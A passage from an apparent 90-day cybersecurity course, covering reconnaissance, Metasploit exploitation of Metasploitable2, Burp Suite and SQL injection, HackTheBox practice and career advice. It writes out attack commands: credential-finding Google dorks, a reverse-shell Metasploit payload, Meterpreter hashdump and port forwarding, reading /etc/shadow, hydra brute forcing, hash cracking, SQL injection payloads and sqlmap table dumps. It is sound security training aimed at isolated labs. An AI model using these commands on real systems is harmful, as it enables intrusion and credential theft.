Elite hackers spend 80% of their time on recon. Know more about the target than they know about themselves.
#Reconnaissance#Nmap#Day86of90
dark Passive Recon (OSINT) Foundation
Passive Recon: No Target Contact
OSINTNmapWeb Enum

Passive recon collects intelligence without touching the target systems — completely legal everywhere. Every data point gathered here shapes every attack decision that follows.

Google Dorking: site:, inurl:, filetype:, intitle: operators — find exposed admin panels, open directories, accidentally published credentials
WHOIS + DNS: Registration data, name servers, MX records — map infrastructure and hosting providers
Shodan.io: Internet-facing infrastructure search — find exposed services before the client knows they are public
Certificate Transparency (crt.sh): Find all subdomains issued TLS certificates — reveals hidden infrastructure
GitHub: Leaked credentials, API keys, internal config files accidentally committed to public repos
20 min · osintframework.com · shodan.io
red Google Dorking OSINT Technique
Google Dorks: Targeted Intelligence
# Find public documents that reveal technology: site:target.com filetype:pdf
# Find exposed admin panels: site:target.com inurl:admin
# Find open directory listings: intitle:"index of" site:target.com
# Find accidentally exposed credentials: site:target.com "password" filetype:txt
# Find secrets leaked to GitHub: site:github.com "target.com" password

Google Hacking Database (GHDB) at exploit-db.com/google-hacking-database has 5,000+ dork queries organised by category. Professional pentesters run through the top 50 against every target before touching a single tool.

25 min · exploit-db.com/google-hacking-database
dark Active Recon with Nmap Scanning
Nmap: Map Every Open Door
# Comprehensive scan — all ports, versions, scripts, OS: nmap -sV -sC -O -p- 192.168.56.X # -sV = service version detection # -sC = run default NSE scripts # -O = OS fingerprinting # -p- = scan all 65535 ports
# Stealth SYN scan (less noisy): nmap -sS -T4 192.168.56.X
# Vulnerability detection scripts: nmap --script vuln 192.168.56.X
# Aggressive scan with timing: nmap -A -T4 192.168.56.X

Metasploitable2 has 20+ intentionally vulnerable open services. Your Nmap scan will return a rich list of old, exploitable versions — exactly what the exploitation phase targets.

30 min · Run all 4 Nmap commands against Metasploitable2
white Web Enumeration Web Recon
Web Enumeration: Find Hidden Paths
# Directory brute-force: gobuster dir -u http://192.168.56.X \ -w /usr/share/wordlists/dirb/common.txt
# Subdomain enumeration (for real targets): gobuster dns -d target.com \ -w /usr/share/wordlists/subdomains-top1million-5000.txt
# Web server vulnerability scan: nikto -h http://192.168.56.X # Finds: outdated server versions, dangerous HTTP methods, # default files, misconfigurations
# WordPress-specific scanning: wpscan --url http://target.com # Enumerates: WP version, plugins, themes, users

All pre-installed on Kali Linux. Run nikto and gobuster against Metasploitable2 — the web server running on it has multiple exploitable paths that these tools will expose immediately.

30 min · Run gobuster and nikto against Metasploitable2
yellow What to Learn Today What to Learn
Day 86 Checklist
  • 1Run `nmap -sV -sC -p- 192.168.56.X` against Metasploitable2 — record every open port, service, and version
  • 2Run `nikto -h http://192.168.56.X` — document all findings in a recon table
  • 3Run `gobuster dir` against the web server — find at least 5 hidden directories
  • 4Create a recon report table: Port | Service | Version | Potential Vulnerability for each finding
  • 5Run 5 Google Dorks against a domain you own — practise the syntax
Total Day 86 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
📺 Video TCM Security — Part 1 Recon Section (YouTube, free) youtube.com/watch?v=3FNYvj2U0HM
🕸️ Map OSINT Framework — Interactive Tool Directory osintframework.com
🔍 Tool Shodan.io — Internet Device Search Engine shodan.io
🔎 Tool crt.sh — Certificate Transparency Subdomain Finder crt.sh
white Action Plan How to Learn
Your Hands-On Task for Day 86
  • 1Run `nmap -sV -sC -p- 192.168.56.X` — save output to `recon_metasploitable.txt`
  • 2Run `nikto -h http://192.168.56.X` — save output — note every warning
  • 3Run `gobuster dir` with common.txt wordlist — list every discovered directory
  • 4Create a recon table: Port | Service | Version | Potential CVE — this becomes Section 3 of your pentest report
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 86
"Experienced pentesters routinely spend 10+ hours on recon before executing a single exploit. The more you know about the target, the more precisely targeted your attack — and the higher your success rate."
Run `theHarvester -d target.com -b all` on any real domain you own — it collects emails, subdomains, IPs, and employee names from 50+ public sources in a single command. Run it against your own domain first. The intelligence it surfaces about you will surprise you — and teach you exactly what attackers know before they start.
⚠ Common Mistake
Skipping passive OSINT and jumping straight to Nmap scanning. Active scanning generates logs on the target system — passive OSINT leaves zero trace. The sequence matters: exhaust all passive sources first, then transition to active scanning when you have already built a detailed picture of the target.
DAY 87
Exploitation: Metasploit Framework & Manual Exploits
Metasploit: the world's most used exploitation framework. 2000+ exploits, one interface.
#Metasploit#Exploitation#Day87of90
dark Metasploit Basics Foundation
Metasploit: 2000+ Exploits, One Interface
msfconsoleMeterpretersearchsploit
# Launch Metasploit: msfconsole
# Core workflow — 6 commands: search vsftpd # 1. Find exploit use exploit/unix/ftp/vsftpd_234_backdoor # 2. Select show options # 3. View requirements set RHOSTS 192.168.56.X # 4. Set target set PAYLOAD cmd/unix/interact # 5. Set payload exploit # 6. Execute

Metasploit is an open-source exploitation framework maintained by Rapid7. Pre-installed on Kali Linux. The same framework used by professional red teams — containing 2,000+ exploits for Windows, Linux, macOS, mobile, and web applications.

25 min · TCM Security Part 2 (YouTube) · Metasploit Unleashed (free)
red Meterpreter Shell Post-Exploitation
Meterpreter: Post-Exploitation Power
# After gaining a Meterpreter shell: sysinfo # Target OS, hostname, architecture getuid # Current user context getsystem # Attempt automatic privilege escalation hashdump # Dump all Windows password hashes
ps # List all running processes migrate PID # Move into another process (stealth) upload /path/file /remote/path # Push file to target download /remote/file /local/ # Pull file from target
portfwd add -l 3389 -p 3389 -r 192.168.1.100 # Forward RDP port for lateral movement to next target run post/multi/recon/local_exploit_suggester # Suggest local privilege escalation exploits automatically

Meterpreter runs entirely in RAM — never writes to disk. This makes it difficult to detect with file-system scanning. The go-to payload for professional red team engagements.

25 min · Practice all Meterpreter commands after gaining a shell
dark Lab Exploits on Metasploitable2 Practice
Metasploitable2: 3 Exploits to Practice
# Exploit 1: vsftpd 2.3.4 backdoor (instant root shell): use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 192.168.56.X exploit # Background: smiley face in username triggers a backdoor # on port 6200 — a real vulnerability from 2011
# Exploit 2: UnrealIRCd backdoor: use exploit/unix/irc/unreal_ircd_3281_backdoor set RHOSTS 192.168.56.X exploit
# Exploit 3: Samba usermap_script: use exploit/multi/samba/usermap_script set RHOSTS 192.168.56.X set PAYLOAD cmd/unix/reverse set LHOST 192.168.56.1 # Your Kali IP exploit

Each exploit maps to a real CVE and demonstrates a different vulnerability class — backdoor, unpatched service, remote code execution via misconfiguration.

45 min · Complete all 3 exploits against Metasploitable2
white Manual Exploitation & Password Attacks Beyond Metasploit
Manual Exploits & Password Attacks
# Search local Exploit-DB copy: searchsploit vsftpd 2.3.4 # Copy exploit to working directory: searchsploit -m 49757 # Read and understand the exploit code: cat 49757.py # Always read before running
# SSH brute force with Hydra: hydra -l admin -P /usr/share/wordlists/rockyou.txt \ ssh://192.168.56.X
# Offline hash cracking: hashcat -m 1000 hashes.txt rockyou.txt # NTLM john --wordlist=rockyou.txt hash.txt # John the Ripper

For OSCP prep: Metasploit is restricted to 1 machine in the exam. Practise searchsploit and manual exploitation heavily — understanding WHY an exploit works is worth 10x more than just running `exploit` in msfconsole.

20 min · Practice searchsploit on 2 Metasploitable2 services
yellow What to Learn Today What to Learn
Day 87 Checklist
  • 1Exploit vsftpd 2.3.4 backdoor using Metasploit — get a root shell
  • 2Run `sysinfo`, `getuid`, `ps`, and `hashdump` — document every output
  • 3Crack the hashdump output using `john --wordlist=rockyou.txt`
  • 4Use searchsploit to find the same vsftpd exploit manually — read the source code
  • 5Document the complete exploitation chain: Recon → Vulnerability → Exploit → Post-Exploit
Total Day 87 Study Time: 120 – 150 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
📺 Video TCM Security — Part 2 Exploitation Section (YouTube) youtube.com/watch?v=sH4JCwjybGs
📖 Course Metasploit Unleashed — Free Comprehensive Course offensive-security.com/metasploit-unleashed
🧪 Lab TryHackMe — 'Metasploit Introduction' Room (free) tryhackme.com/room/metasploitintro
🎯 Targets VulnHub — Free Downloadable Vulnerable VMs vulnhub.com
white Action Plan How to Learn
Your Hands-On Task for Day 87
  • 1Launch msfconsole → `use exploit/unix/ftp/vsftpd_234_backdoor` → set RHOSTS → `exploit`
  • 2In the shell: run `id`, `whoami`, `uname -a`, `cat /etc/shadow` — save all output
  • 3Run hashdump → save hashes → crack with `john --wordlist=rockyou.txt hashes.txt`
  • 4Document the full chain in a findings table: CVE | Service | Exploit Used | Access Level | Evidence
Hands-On Task: 90 – 120 minutes
quote Pro Tip Pro Tip · Day 87
"Practice manual exploitation heavily alongside Metasploit — the OSCP exam restricts Metasploit to just one machine. Understanding why an exploit works is worth 10x more than knowing how to run it."
Set up your lab on a completely isolated host-only network with NO bridge to your physical network or internet. Metasploitable2 has intentional backdoors and vulnerabilities that could be exploited by others if it is accessible outside your isolated environment. Always verify network isolation before powering on vulnerable VMs.
⚠ Common Mistake
Relying entirely on Metasploit without understanding the underlying vulnerability. When Metasploit succeeds, read the module's source code to understand what it actually did. When it fails, read error messages to diagnose why. The tool is a shortcut — the knowledge is the career asset.
DAY 88
Web Application Hacking: Burp Suite & OWASP Top 10
80% of modern applications are web-based. Web hacking is the highest-demand penetration testing skill.
#BurpSuite#WebHacking#Day88of90
dark Burp Suite Community Edition Foundation
Burp Suite: See and Control Every Request
ProxyRepeaterOWASP Top 10

Burp Suite Community Edition (free) is the industry-standard web application security testing platform. Install from portswigger.net → set browser proxy to 127.0.0.1:8080 → you now see and control every HTTP/HTTPS request your browser makes.

Proxy: Intercept and modify every HTTP/HTTPS request and response in real time — the core feature
Repeater: Manually replay and modify individual requests — essential for manual vulnerability testing
Intruder: Automated parameter fuzzing — brute force logins, parameter enumeration (rate-limited in free tier)
Decoder: Encode/decode Base64, URL encoding, HTML entities — decode obfuscated payloads instantly
Comparer: Side-by-side comparison of two requests or responses — spot subtle authentication differences
20 min · portswigger.net/burp/communitydownload
red OWASP Top 10 (2021) Web Vulnerabilities
OWASP Top 10: Know All 10 Deeply
A01: Broken Access Control — most prevalent 2021 A02: Cryptographic Failures — sensitive data exposed A03: Injection — SQLi, XSS, command A04: Insecure Design — architectural flaws A05: Security Misconfiguration — default passwords, open cloud
A06: Vulnerable Components — outdated libraries A07: Auth Failures — weak sessions, no MFA A08: Data Integrity Failures — unsigned updates, CI/CD A09: Logging Failures — no audit trail A10: SSRF — server-side request forgery

Every web security interview covers the OWASP Top 10. Every bug bounty programme references it. Every web pentest report maps findings to it. Know all 10 deeply — what causes each, how to detect it, and how to remediate it.

20 min · owasp.org/Top10 — read each category
dark SQL Injection A03 — Most Famous
SQL Injection: The Classic Attack
# Login bypass (basic): Username: admin'-- Password: anything # SQL becomes: SELECT * FROM users WHERE user='admin'--' AND pass='...' # The -- comments out the password check entirely
# UNION-based data extraction: ' UNION SELECT username, password FROM users-- # Appends a second query — dumps the entire user table
# Automated with SQLMap: sqlmap -u "http://192.168.56.X/page?id=1" --dbs # Enumerates all databases automatically sqlmap -u "http://192.168.56.X/page?id=1" -D dvwa --tables sqlmap -u "http://192.168.56.X/page?id=1" -D dvwa -T users --dump

The fix is one line: use parameterised queries (prepared statements). SQLi is entirely preventable — yet remains in the OWASP Top 10 because legacy codebases and untrained developers continue producing vulnerable code daily.

25 min · PortSwigger SQLi Labs 1–4
white XSS & Practice Applications Client-Side Attacks
XSS & Practice Targets

Cross-Site Scripting (XSS): Inject malicious JavaScript into a web page that executes in other users' browsers. Test with `` in every input field.

Reflected XSS: Payload in the URL — affects only the user who clicks the link. Delivered via phishing.
Stored XSS: Payload saved to the database — executes for every user who views the page. Highest impact.
Impact: Steal session cookies → account takeover · Redirect to phishing pages · Keylog form input
# Deploy Juice Shop (best practice target): docker run -p 3000:3000 bkimminich/juice-shop # Also available: DVWA, WebGoat, bWAPP — all free

PortSwigger Web Academy (portswigger.net/web-security) has 30 free XSS labs of increasing difficulty — better than any paid course.

25 min · Deploy Juice Shop and find the first XSS
yellow What to Learn Today What to Learn
Day 88 Checklist
  • 1Install Burp Suite Community Edition — configure browser proxy to 127.0.0.1:8080 — intercept one request
  • 2Deploy OWASP Juice Shop with Docker — browse it through Burp — examine all intercepted requests
  • 3Find and exploit the SQL injection on the Juice Shop login — access the admin account
  • 4Find an XSS vulnerability — pop an `alert(1)` in the browser
  • 5Use Burp Repeater to manually modify a request — change a parameter and observe the response
Total Day 88 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🏋️ Labs PortSwigger Web Academy — 200+ Free Labs (best resource) portswigger.net/web-security
🧃 Target OWASP Juice Shop — Modern Vulnerable Web App github.com/juice-shop/juice-shop
🧪 Lab TryHackMe — 'OWASP Top 10' Room (free) tryhackme.com/room/owasptop10
📖 Reference OWASP Top 10 — Official Documentation owasp.org/Top10
white Action Plan How to Learn
Your Hands-On Task for Day 88
  • 1Start Juice Shop with Docker → open Burp Suite → set browser proxy → verify interception works
  • 2Test every login field with `'` — observe which returns a SQL error → exploit to access admin
  • 3Test every input field with `` — find and trigger stored XSS
  • 4Document each vulnerability: what you found, how you exploited it, what the secure code fix is
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 88
"PortSwigger Web Academy is completely free, has 200+ hands-on labs, and is genuinely better than most paid courses. Complete the SQL injection and XSS learning paths — 40+ labs each — and you have job-ready web pentesting skills."
Always configure Burp's 'Intercept OFF' when not actively testing. Having intercept ON while browsing normally causes every request to hang until manually forwarded — you will forget it is on, wonder why every page is broken, and waste 10 minutes before remembering. Toggle intercept deliberately for each test and off immediately after.
⚠ Common Mistake
Only using SQLMap without understanding manual SQL injection first. SQLMap can miss injection points and cannot explain why an injection works. Manual testing with a single quote, observing the error, understanding the SQL query structure, and crafting the UNION payload — that understanding makes you a web pentester. SQLMap makes you a button pusher.
DAY 89
HackTheBox, CTFs & Writing Pentest Reports
Day 89. One day left. HackTheBox is where real hackers prove their skills. Reports are how you get paid.
#HackTheBox#CTF#Day89of90
dark HackTheBox Platform Foundation
HackTheBox: Where Real Skills Are Proven
HTB Starting PointVulnHubPentest Report

HackTheBox (HTB) is a machine-based penetration testing practice platform used by professional pentesters and red teamers globally to continuously sharpen real-world skills against realistic targets.

Starting Point (free): Completely free, guided machines — Tier 0 and Tier 1. Perfect for this week. Start here today.
Retired machines (free with VIP or with writeup guides): Hundreds of machines with published solutions. The best learning combination: solve → watch IppSec → understand 10 techniques you missed.
Active machines (VIP $14/month): Current challenge machines — no published solutions. Closest to a real engagement.
Challenges: Crypto, forensics, web, reversing, OSINT — all the skills from the previous 88 days applied in competitive puzzle format.
20 min · hackthebox.com → Starting Point → Tier 0
red HTB Starting Point — Free Path Beginner Machines
Starting Point: 8 Free Machines, 8 Skills
Meow (Tier 0): Telnet default credentials — the simplest possible entry point. Teaches: service enumeration, credential testing.
Fawn (Tier 0): Anonymous FTP login — files accessible without authentication. Teaches: FTP enumeration, anonymous access.
Dancing (Tier 0): SMB null session — enumerate shares without credentials. Teaches: SMB enumeration with smbclient.
Redeemer (Tier 0): Redis with no authentication — dump the in-memory database. Teaches: uncommon service enumeration.
Explosion (Tier 1): RDP default credentials — graphical remote access. Teaches: RDP enumeration, Windows target access.
Preignition (Tier 1): Web application with default admin credentials on a hidden directory. Teaches: gobuster, web credential testing.
90 min · Complete all 4 Tier 0 machines today
dark VulnHub for Offline Practice Offline Lab
VulnHub: Free Offline Lab Machines

VulnHub provides free downloadable vulnerable VMs — no subscription, no internet required. Import to VirtualBox, put on host-only network with Kali, start hacking.

Mr. Robot — 3 flags, web enumeration + WordPress + Linux privilege escalation. Based on the TV show.
Kioptrix Level 1 — classic beginner machine with multiple exploitation paths. Great OSCP prep.
DC-1 — Drupal CMS exploitation + Linux privesc. Realistic web application attack chain.
Basic Pentesting — multiple services, multiple entry points. Perfect for practising the full methodology.

CTF strategy: Struggle for 15–20 minutes before checking technique references (not specific machine solutions). Document every step even if you do not solve it — the investigation process is the learning.

Download and start Mr. Robot if time permits
white Professional Pentest Report Career Deliverable
Pentest Report: The Real Deliverable

A polished 15-page pentest report is worth more on your portfolio than 50 screenshots of shells. The report IS the professional deliverable — what clients pay for and what employers evaluate.

Executive Summary (1 page): Written for management — zero technical jargon. Business risk and impact focus. The CEO reads ONLY this.
Technical Findings (one page per finding): Title · Severity · CVSS score · Affected system · Description · Evidence (screenshot + command) · Reproduction steps · Remediation recommendation.
Appendix: Full scan output, tool versions, testing timeline, methodology references.

Free template: github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report — professional structure used by real pentest firms. Clone it, fill in your Metasploitable2 findings, export as PDF, upload to GitHub.

60 min · Write your Metasploitable2 report using the TCM template
yellow What to Learn Today What to Learn
Day 89 Checklist
  • 1Complete HTB Starting Point Tier 0 — all 4 machines (Meow, Fawn, Dancing, Redeemer) — takes ~90 minutes
  • 2Write a pentest report for your Metasploitable2 work using the TCM Security template
  • 3Include at minimum 3 findings: vsftpd backdoor, open SMB, web SQLi on DVWA
  • 4Upload the PDF report to your GitHub cybersecurity-tools repo — a pentest report on GitHub is instant credibility
  • 5Watch IppSec's walkthrough for any HTB machine you completed — see the methodology you missed
Total Day 89 Study Time: 150 – 180 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🏆 Practice HackTheBox — Starting Point (completely free) hackthebox.com
📺 Videos IppSec — Best HTB Machine Walkthroughs (YouTube) youtube.com/@ippsec
📋 Template TCM Security — Free Professional Pentest Report Template github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report
🎯 Targets VulnHub — Free Downloadable Vulnerable VMs vulnhub.com
white Action Plan How to Learn
Your Hands-On Task for Day 89
  • 1Complete HTB Starting Point Tier 0 all 4 machines — document every command used
  • 2Clone TCM Security report template from GitHub — fill in your Metasploitable2 findings
  • 3Write Executive Summary (3 sentences) + 3 Technical Findings with evidence screenshots
  • 4Export as PDF → upload to GitHub cybersecurity-tools repo → add link to your README
Hands-On Task: 120 – 150 minutes
quote Pro Tip Pro Tip · Day 89
"Solve a machine then IMMEDIATELY watch IppSec's walkthrough. You will see the same solution plus 5 additional techniques, alternative approaches, and professional methodology you completely missed. Do this for 20 machines and your instincts become elite."
Never share active HTB machine flags, solutions, or spoilers publicly. It violates HTB's Terms of Service and disrespects the community that maintains the platform. Wait until a machine is retired before posting public writeups. The community's trust — and the platform's value to everyone — depends on this respect.
⚠ Common Mistake
Writing a pentest report that only technical people can understand. A professional report serves multiple audiences simultaneously: executive summary for leadership (business impact, no jargon), technical findings for security teams (reproduction steps, evidence, code), IOC appendix for defensive tools (IPs, hashes, indicators). Write each section for its specific reader.
DAY 90
DAY 90: Complete Roadmap Recap & Your Next 90 Days
DAY 90. YOU DID IT. 90 days. 90 posts. 900 slides. Your cybersecurity foundation is fully built.
#Day90of90#90DaysOfCybersecurity#CareerLaunch
dark Phases 1–5 Mastered Your Achievement
Phases 1–5: 5 Domains Mastered
90 Days DoneCareer ReadyKeep Going
Phase 1 — Networking: OSI model, TCP/IP, subnetting, DNS, protocols, ports, VPN, IDS/IPS — complete networking foundation every security role requires.
Phase 2 — Security+: CIA triad, malware types, phishing, cryptography, IAM, risk management, incident response — the full Security+ knowledge base.
Phase 3 — Linux: CLI mastery, file permissions, Bash scripting, SSH hardening, log analysis, forensics, OverTheWire Bandit — professional Linux proficiency.
Phase 4 — Python: Sockets, Scapy, OSINT automation, threat intel APIs, Pandas log analysis, CLI security tools — security developer capabilities.
Phase 5 — Traffic Analysis: Wireshark, tcpdump, Suricata, Zeek, Security Onion, malware traffic, threat hunting — professional traffic analyst skills.
Review all 9 phases — appreciate how far you have come
red Phases 6–9 Mastered Advanced Domains
Phases 6–9: 4 Advanced Domains
Phase 6 — Git & DevSecOps: Version control, branching, PRs, GitHub Actions CI/CD pipelines, Detection-as-Code with Sigma rules — the complete modern security engineering workflow.
Phase 7 — ELK SIEM: Logstash pipelines, Kibana dashboards, KQL queries, Filebeat log shipping, Elastic Security detection rules, full SOC investigation workflow from alert to closed case.
Phase 8 — Cloud Security: Cloud IAM, AWS/GCP/Azure security architecture, container security, CloudGoat pentesting, IaC scanning with Checkov, cloud incident response — cloud security practitioner knowledge.
Phase 9 — Ethical Hacking: Pentest methodology, Nmap recon, Metasploit exploitation, Burp Suite web hacking, HTB/CTF practice, professional pentest report writing — the complete ethical hacker skill set.
Update your LinkedIn and GitHub with all 9 phase skills today
dark Your Next 90 Days Career Paths
Next 90 Days: Choose ONE Path
SOC Analyst Path: Security+ exam → CySA+ → Splunk Core User → apply for Tier 1 SOC roles immediately. The most accessible entry point with your current skills.
Penetration Tester Path: eJPT → PNPT → continue HTB/VulnHub daily → OSCP (the gold standard). Requires 6–12 months of dedicated lab practice beyond Day 90.
Cloud Security Path: SC-200 or AWS Security Specialty → cloud security portfolio project → apply for cloud security engineer roles. Highest-paying entry-level path at $95–115k.
Security Engineer / DevSecOps: Build on GitHub Actions + Checkov work → AWS Solutions Architect Associate → target companies with open-source security stacks.

Focus beats spreading. Choose the path that excites you most. Deep expertise in one domain beats shallow knowledge across four — always.

Decide your path today — write it down and commit to it
white Job Application Strategy Career Action
Job Strategy: Apply Today, Not When Ready
  • 1LinkedIn: Optimise your profile — security skills section + headline with target role + 90-day journey post + connect with 20 security professionals this week
  • 2GitHub: 6+ pinned repos + pentest report PDF + cloud audit project + Sigma rules collection — your portfolio is already built
  • 3Resume: 1 page, lead with technical skills, emphasise PROJECTS over coursework — your GitHub is your experience
  • 4Apply: 10 applications per week minimum — Indeed, LinkedIn Jobs, CyberSecJobs.com, DICE, direct company career pages
  • 5Apply even when not ready — the application process reveals exactly what gaps to fill next
Apply to 3 security jobs TODAY — before you feel ready
yellow Salary Ranges & Target Roles Market Reality
Day 90 Final Checklist
  • 1Post your Day 90 celebration on LinkedIn with your GitHub link and target role
  • 2Write resume bullet points for your top 3 portfolio projects — specific, measurable, tool-named
  • 3Apply to 3 security jobs today — the application process teaches you what to build next
  • 4Connect with 5 security professionals on LinkedIn — personalised notes, not copy-paste
  • 5Schedule your first certification exam date — booking it transforms intention into commitment
Do all 5 tasks today — Day 90 is the beginning, not the finish line
resources_white Keep Learning Forever Lifelong Resources
Free Resources: Never Stop Learning
📰 News Krebs on Security · The Hacker News · Bleeping Computer krebsonsecurity.com
🎙️ Podcasts Darknet Diaries · Risky Business — weekly listening habit darknetdiaries.com
🎯 Framework MITRE ATT&CK — updated continuously, bookmark forever attack.mitre.org
🎤 Conferences BSides (many free) · DEF CON talks (all free on YouTube) youtube.com/@DEFCONConference
white Salary Ranges (US 2025) Market Data
Your Skills Are Worth: Real Salary Ranges
  • 1SOC Analyst Tier 1: $50–70k — immediately achievable with your current skills and Security+
  • 2SOC Analyst Tier 2: $70–90k — after 12–18 months experience and CySA+
  • 3Junior Penetration Tester: $65–85k — after eJPT/PNPT and consistent HTB practice
  • 4Cloud Security Engineer (entry): $95–115k — highest-paying entry path with AWS Security Specialty
  • 5Detection Engineer: $110–145k — Sigma + ELK + ATT&CK + development skills combined
  • 6Threat Hunter: $110–150k — requires 2–3 years SOC experience plus hunting methodology
Research salaries in YOUR specific market at levels.fyi and glassdoor.com
stats 90 Days Complete Your Achievement
90 Days Complete — What You Built
90
Days of consistent daily learning — not one missed
9
Security domains mastered: Networking through Ethical Hacking
7+
Portfolio projects live on GitHub with full documentation
3.5M
Unfilled cybersecurity positions globally — the market needs you
quote Final Pro Tip Day 90 — The Beginning
"The cybersecurity talent shortage is 3.5 million unfilled positions globally. Demand permanently exceeds supply. Every day you continue practicing makes you more valuable in a market that desperately needs skilled people."
You are NOT the same person who started Day 1. You understand networking at packet level, write working security tools, operate Linux fluently, build SIEMs, audit cloud infrastructure, and conduct penetration tests. That combination exists in a tiny fraction of the security workforce. The community is welcoming and supportive of people who show real, consistent effort. Show up, build publicly, connect genuinely. Your career in security is not a question of IF — it is a question of WHEN.
⚠ Common Mistake
Thinking Day 90 is the finish line. It is the foundation. The best security professionals never stop learning — because attackers never stop evolving. Security changes weekly. Your 90-day habit of daily consistent learning is the single most valuable thing you built. Keep it. The compounding effect of continued daily practice over the next year will transform you from a knowledgeable beginner into a genuine expert.
90 Days of Cybersecurity — Generated April 26, 2026 | 90 learning days across 9 phases
